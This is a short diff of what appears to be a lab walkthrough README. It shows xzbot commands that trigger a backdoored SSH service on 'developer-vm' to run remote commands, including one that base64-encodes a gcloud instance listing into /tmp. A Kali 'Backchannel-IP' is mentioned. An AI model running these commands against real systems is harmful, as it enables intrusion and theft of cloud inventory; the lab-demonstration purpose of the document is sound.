@@ -124,7 +124,7 @@ yarn install
 yarn start &
 ```
 
-Next we trigger the xzboit to build our script. Adjust the Backchannel-IP (KALILINUX-IP) to your real kali linux IP.
+Next we trigger the xzbot to build our script. Adjust the Backchannel-IP (KALILINUX-IP) to your real kali linux IP. You can easily add additional steps but keep in mind that the cmd you can embed is limited to 64 character.
 ```
 xzbot -addr developer-vm:22 -cmd "uname -a > /tmp/x.uname"
 xzbot -addr developer-vm:22 -cmd "gcloud compute instances list |base64 >> /tmp/x.gcloud"
